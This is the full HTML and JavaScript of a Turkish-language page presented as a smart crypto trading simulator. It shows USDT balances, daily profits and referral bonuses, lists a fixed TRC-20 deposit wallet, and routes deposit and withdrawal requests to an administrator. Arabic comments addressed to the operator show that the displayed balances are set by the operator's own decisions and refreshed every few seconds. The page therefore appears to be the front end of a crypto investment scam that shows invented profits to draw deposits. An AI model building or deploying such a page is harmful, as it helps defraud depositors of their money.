<!DOCTYPE html>
<html lang="tr" translate="no">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="google" content="notranslate">
    <title>Bulut Platformu</title>
    <style>
        body { background-color: #0d1527; color: white; font-family: sans-serif; text-align: center; padding: 15px; margin: 0; }
        .container { max-width: 480px; margin: auto; background: #152238; padding: 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); text-align: left; }
        .title-app { text-align: center; color: #3b82f6; font-size: 20px; font-weight: bold; margin-bottom: 20px; }
        .label-text { font-size: 13px; color: #3b82f6; margin-bottom: 5px; display: block; font-weight: bold; }
        input { width: 100%; padding: 12px; box-sizing: border-box; margin-bottom: 12px; border-radius: 6px; border: 1px solid #1e293b; background: #0d1527; color: white; text-align: center; font-size: 15px; }
        button { width: 100%; padding: 12px; box-sizing: border-box; margin-bottom: 10px; border-radius: 6px; border: none; font-weight: bold; cursor: pointer; font-size: 15px; text-align: center; }
        .btn-blue { background: #1d4ed8; color: white; }
        .btn-green { background: #16a34a; color: white; }
        .btn-red { background: #dc2626; color: white; }
        .info-box { background: #0d1527; padding: 12px; border-radius: 8px; margin: 15px 0; border: 1px solid #1e293b; }
        .info-row { display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px solid #1e293b; font-size: 14px; }
        .crypto-box { border: 1px dashed #22c55e; padding: 10px; margin: 15px 0; border-radius: 6px; background: rgba(34, 197, 94, 0.05); text-align: center; }
        .crypto-address { color: #4ade80; font-size: 13px; word-break: break-all; display: block; margin-top: 5px; }
    </style>
</head>
<body>

<div class="container">
    <div class="title-app">☁️ Akıllı Alım Satım Simülatörü ve Bulut Analiz Sistemi</div>
    
    <label class="label-text">👤 Mevcut kullanıcı adı</label>
    <input type="text" id="usernameInput" placeholder="Kullanıcı adınızı buraya girin">
    <button class="btn-blue" onclick="loginUser()">💾 Hesabı kaydet ve kilitle</button>

    <div class="info-box">
        <div class="info-row"><span>Toplam sermaye:</span><span><span id="val-balance" style="color:#22c55e; font-weight:bold;">0,00</span> USDT</span></div>
        <div class="info-row"><span>Günlük karlar:</span><span><span id="val-profit" style="color:#eab308; font-weight:bold;">0,00</span> USDT</span></div>
        <div class="info-row"><span>Davet ödülleri:</span><span><span id="val-bonus" style="color:#a855f7; font-weight:bold;">0,00</span> USDT</span></div>
    </div>

    <div class="info-box" style="border-color: #ef4444;">
        <div style="text-align: center; font-size: 13px; color: #ef4444; margin-bottom: 8px;">🚨 Anında Doğrudan Para Çekme Geçidi (TRC-20 Ağı):</div>
        <input type="number" id="withdrawAmount" placeholder="USDT cinsinden tutar">
        <input type="text" id="walletInput" placeholder="Aldığınız TRC-20 cüzdan adresinizi girin">
        <button class="btn-red" onclick="sendWithdrawRequest()">💥 Para çekme talebinizi yöneticinize gönderin.</button>
    </div>

    <div class="crypto-box">
        <span style="font-size: 13px; color: #eab308;">📥 Resmi para yatırma cüzdanı - USDT ağı (TRC-20):</span>
        <strong class="crypto-address">TA1vsgrJEFy3YM6rkQWBppnZemFE6c9pBN</strong>
        <input type="number" id="depositAmount" placeholder="Gönderim tutarını USDT cinsinden girin" style="margin-top: 10px;">
        <button class="btn-green" onclick="sendDepositRequest()">⚡ Para yatırma talebini yöneticiye gönderin</button>
    </div>
</div>

<script>
    // ربط الواجهة مباشرة وبشكل قطعي بسيرفر Render الموحد الخاص بك
    const API_URL = window.location.origin;
    let currentUsername = "";

    async function loginUser() {
        const username = document.getElementById('usernameInput').value.trim();
        if(!username) return alert("Lütfen önce kullanıcı adınızı girin!");
        
        try {
            const res = await fetch(`${API_URL}/backend/user/login`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username })
            });
            const data = await res.json();
            if(data.success) {
                currentUsername = username;
                updateUI(data.user);
                alert("Hesap doğrulandı ve akıllı işlem sistemi başarıyla kaydedildi!");
                // تشغيل التحديث التلقائي المستمر للأرصدة كل 4 ثوانٍ لقراءة قراراتك
                setInterval(refreshUserData, 4000);
            }
        } catch (err) {
            alert("Sunucu bağlantı hatası!");
        }
    }

    function updateUI(user) {
        document.getElementById('val-balance').innerText = user.balance.toFixed(2).replace('.', ',');
        document.getElementById('val-profit').innerText = user.todayProfit.toFixed(2).replace('.', ',');
        document.getElementById('val-bonus').innerText = user.bonus.toFixed(2).replace('.', ',');
    }

    async function refreshUserData() {
        if(!currentUsername) return;
        try {
            const res = await fetch(`${API_URL}/backend/user/login`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: currentUsername })
            });
            const data = await res.json();
            if(data.success) updateUI(data.user);
        } catch(e) {}
    }

    async function sendDepositRequest() {
        if(!currentUsername) return alert("Lütfen önce hesabı kilitleyin!");
        const amount = document.getElementById('depositAmount').value;
        if(!amount) return alert("Lütfen önce kargo tutarını girin!");

        try {
            const res = await fetch(`${API_URL}/backend/user/request`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: currentUsername, amount, type: 'deposit', walletAddress: 'Şarj TRC20' })
            });
            const data = await res.json();
            if(data.success) {
                alert("⚡ Para yatırma talebi başarıyla alındı ve yönetim tarafından otomatik olarak incelenip onaylanıyor!");
                document.getElementById('depositAmount').value = "";
            }
        } catch(e) { alert("Bağlantı hatası!"); }
    }

    async function sendWithdrawRequest() {
        if(!currentUsername) return alert("Lütfen önce hesabı kilitleyin!");
        const amount = document.getElementById('withdrawAmount').value;
        const wallet = document.getElementById('walletInput').value.trim();
        if(!amount || !wallet) return alert("Lütfen tutar ve cüzdan alanlarını doldurun!");

        try {
            const res = await fetch(`${API_URL}/backend/user/request`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: currentUsername, amount, type: 'withdraw', walletAddress: `Cüzdan: ${wallet}` })
            });
            const data = await res.json();
            if(data.success) {
                alert("Para çekme talebiniz başarıyla gönderildi! İşlem en kısa sürede incelenecektir.");
                document.getElementById('withdrawAmount').value = "";
                document.getElementById('walletInput').value = "";
            }
        } catch(e) { alert("Bağlantı hatası!"); }
    }
</script>
</body>
</html>
